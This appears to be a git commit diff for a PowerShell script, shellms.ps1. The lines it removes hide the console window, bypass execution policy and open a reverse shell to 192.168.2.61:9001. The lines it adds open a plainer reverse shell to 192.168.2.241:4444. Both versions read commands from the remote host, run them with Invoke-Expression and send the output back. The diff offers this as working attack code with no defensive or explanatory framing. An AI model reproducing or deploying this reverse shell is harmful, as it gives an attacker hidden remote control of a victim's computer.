0ce9341ad7873341da5b235efaec5c8ad0aca17e
MicrolinsJM <141961584+MicrolinsJM@users.noreply.github.com>
2024-05-17 11:17:18 -0300

    Update shellms.ps1

--- shellms.ps1
+++ shellms.ps1
@@ -1,5 +1,17 @@
-$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
-add-type -name win -member $t -namespace native
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
-powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('192.168.2.61', 9001);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+$tcpClient = New-Object Net.Sockets.TcpClient
+$tcpClient.Connect("192.168.2.241", 4444)
+$stream = $tcpClient.GetStream()
+$buffer = New-Object Byte[] 4096
 
+while ($true) {
+    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
+    if ($bytesRead -le 0) { break }
+
+    $command = [Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
+    $output = Invoke-Expression $command 2>&1
+    $outputBytes = [Text.Encoding]::ASCII.GetBytes($output)
+    $stream.Write($outputBytes, 0, $outputBytes.Length)
+}
+
+$stream.Close()
+$tcpClient.Close()
